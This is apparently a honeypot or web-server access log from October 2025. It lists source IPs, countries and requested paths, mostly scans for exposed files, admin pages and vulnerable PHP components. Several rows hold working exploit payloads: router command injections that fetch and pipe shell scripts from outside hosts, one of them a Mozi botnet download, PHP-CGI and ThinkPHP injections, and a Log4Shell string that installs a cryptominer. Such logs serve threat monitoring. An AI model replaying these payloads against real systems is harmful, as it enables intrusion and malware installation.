"2025-10-08","45.156.129.135","Portugal","HTTP","/OA_HTML/AppsLocalLogin.jsp"
"2025-10-08","188.166.156.74","United Kingdom","HTTP","/download/powershell/"
"2025-10-08","188.166.156.74","United Kingdom","HTTP","/get.php"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","64.62.197.176","United States","HTTP","http://api.ipify.org/?format=json"
"2025-10-08","64.62.197.167","United States","HTTP","/geoserver/web/"
"2025-10-08","109.205.213.5","Azerbaijan","HTTP","/backupmgt/localJob.php?session=fail;cd+/tmp;wget+http://109.205.213.5/tlr;curl+-O+http://109.205.213.5/tlr;chmod+777+tlr;sh+tlr;"
"2025-10-08","59.182.73.13","India","HTTP","/HNAP1/"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","144.129.7.50","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-10-08","144.129.7.50","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/.git/refs/heads/"
"2025-10-08","34.59.175.189","United States","HTTP","/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2025-10-08","34.59.175.189","United States","HTTP","/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/lib/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/lib/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/lib/phpunit/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2025-10-08","34.59.175.189","United States","HTTP","/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-10-08","34.59.175.189","United States","HTTP","/public/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2025-10-08","34.59.175.189","United States","HTTP","/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/\u003c?echo(md5(\"hi\"));?\u003e+/tmp/index1.php"
"2025-10-08","34.59.175.189","United States","HTTP","/index.php?lang=../../../../../../../../tmp/index1"
"2025-10-08","34.59.175.189","United States","HTTP","/containers/json"
"2025-10-08","117.244.230.228","India","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://117.244.230.228:45749/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-10-08","192.241.152.236","United States","HTTP","/form.html"
"2025-10-08","192.241.152.236","United States","HTTP","/upl.php"
"2025-10-08","192.241.152.236","United States","HTTP","/t4"
"2025-10-08","192.241.152.236","United States","HTTP","/geoip/"
"2025-10-08","192.241.152.236","United States","HTTP","/favicon.ico"
"2025-10-08","192.241.152.236","United States","HTTP","/1.php"
"2025-10-08","192.241.152.236","United States","HTTP","/systembc/password.php"
"2025-10-08","192.241.152.236","United States","HTTP","/password.php"
"2025-10-08","103.252.89.75","Germany","HTTP","/login"
"2025-10-08","188.166.254.151","Singapore","HTTP","/.env"
"2025-10-08","188.166.254.151","Singapore","HTTP","/.git/config"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","20.163.14.102","United States","HTTP","/actuator/health"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","131.196.48.84","Brazil","HTTP","/admin/config.php"
"2025-10-08","45.144.212.235","Ukraine","HTTP","/.git/HEAD"
"2025-10-08","143.244.181.47","United States","HTTP","/admin/config.php"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","102.22.20.125","Ghana","HTTP","/admin/config.php"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","162.142.125.210","United States","HTTP","/sitemap.xml"
"2025-10-08","103.105.208.136","Pakistan","HTTP","/admin/config.php"
"2025-10-08","193.138.218.212","Sweden","HTTP","/.env"
"2025-10-08","64.62.156.26","United States","HTTP","/favicon.ico"
"2025-10-08","64.62.156.24","United States","HTTP","/geoserver/web/"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/.git/refs/tags/"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","80.94.92.19","Romania","HTTP","/favicon.ico"
"2025-10-08","80.94.92.19","Romania","HTTP","/favicon.ico"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-08","64.227.79.188","The Netherlands","HTTP","/download/powershell/"
"2025-10-08","64.227.79.188","The Netherlands","HTTP","/get.php"
"2025-10-08","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/.git/config"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/_profiler/phpinfo"
"2025-10-08","209.38.37.132","The Netherlands","HTTP","/.env"
"2025-10-08","209.38.37.132","The Netherlands","HTTP","/.git/config"
"2025-10-08","20.64.104.82","United States","HTTP","/portal/redlion"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","45.144.212.235","Ukraine","HTTP","/.git/config"
"2025-10-08","152.32.201.119","Japan","HTTP","/favicon.ico"
"2025-10-08","152.32.201.119","Japan","HTTP","/robots.txt"
"2025-10-08","152.32.201.119","Japan","HTTP","/sitemap.xml"
"2025-10-08","152.32.201.119","Japan","HTTP","/config.json"
"2025-10-08","206.168.34.44","United States","HTTP","/favicon.ico"
"2025-10-08","206.168.34.44","United States","HTTP","/favicon.ico"
"2025-10-08","206.168.34.44","United States","HTTP","/login"
"2025-10-08","118.194.250.22","Thailand","HTTP","/favicon.ico"
"2025-10-08","118.194.250.22","Thailand","HTTP","/sitemap.xml"
"2025-10-08","118.194.250.22","Thailand","HTTP","/robots.txt"
"2025-10-08","45.144.212.235","Ukraine","HTTP","/_profiler/phpinfo"
"2025-10-08","45.38.44.226","United States","HTTP","/login"
"2025-10-08","45.38.44.226","United States","HTTP","/goform/set_LimitClient_cfg"
"2025-10-08","180.149.126.12","Mongolia","HTTP","/stalker_portal/server/tools/auth_simple.php"
"2025-10-08","87.120.191.37","United States","HTTP","http://ip-api.com/json/"
"2025-10-08","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-08","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-08","172.202.118.38","United States","HTTP","/developmentserver/metadatauploader"
"2025-10-08","45.38.44.226","United States","HTTP","/goform/set_LimitClient_cfg"
"2025-10-08","202.93.142.22","Indonesia","HTTP","/admin/config.php"
"2025-10-08","45.144.212.235","Ukraine","HTTP","/.git/refs/"
"2025-10-08","52.249.221.45","United States","HTTP","/hudson"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/.git/refs/remotes/"
"2025-10-08","144.172.116.36","United States","HTTP","/boaform/admin/formLogin"
"2025-10-08","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-08","195.178.110.201","Bulgaria","HTTP","/.git/index"
"2025-10-08","159.223.161.158","United States","HTTP","/download/powershell/"
"2025-10-08","159.223.161.158","United States","HTTP","/get.php"
"2025-10-08","167.94.145.110","United States","HTTP","/security.txt"
"2025-10-08","147.182.213.15","United States","HTTP","/wsman"
"2025-10-08","173.255.229.59","United States","HTTP","/auth.html"
"2025-10-08","173.255.229.59","United States","HTTP","/auth1.html"
"2025-10-08","173.255.229.59","United States","HTTP","/sslvpnLogin.html"
"2025-10-08","173.255.229.59","United States","HTTP","/api/sonicos/auth"
"2025-10-08","173.255.229.59","United States","HTTP","/api/sonicos/tfa"
"2025-10-08","206.189.76.62","United States","HTTP","/favicon.ico"
"2025-10-08","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-08","80.75.212.83","Germany","HTTP","/t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29"
